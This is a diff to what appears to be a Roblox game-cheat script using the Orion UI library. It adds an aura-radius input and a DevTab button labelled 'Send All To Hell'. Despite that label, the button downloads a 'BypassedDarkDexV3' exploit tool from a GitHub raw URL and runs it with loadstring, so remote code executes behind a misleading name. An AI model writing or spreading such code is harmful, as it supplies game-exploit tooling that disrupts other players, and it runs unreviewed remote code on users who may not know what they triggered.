@@ -1527,6 +1527,18 @@ AuraTab:AddSlider({
     end
 })
 
+
+
+
+AuraTab:AddInput({
+Name = "Set Aura Radius",
+Callback = function(val)
+auraRadius = val
+end
+})
+
+
+
 AuraTab:AddToggle({
     Name = "Air Suspend Aura",
     Color = Color3.fromRGB(240, 0, 0),
@@ -2632,6 +2644,14 @@ DevTab:AddToggle({
         end
     end
 })
+
+DevTab:AddButton({
+    Name = "Send All To Hell",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
+    end
+})
+
 
 OrionLib:MakeNotification({Name = "Welcome", Content = "the fog is coming ", Image = "rbxassetid://4483345998", Time = 5})
 OrionLib:Init()
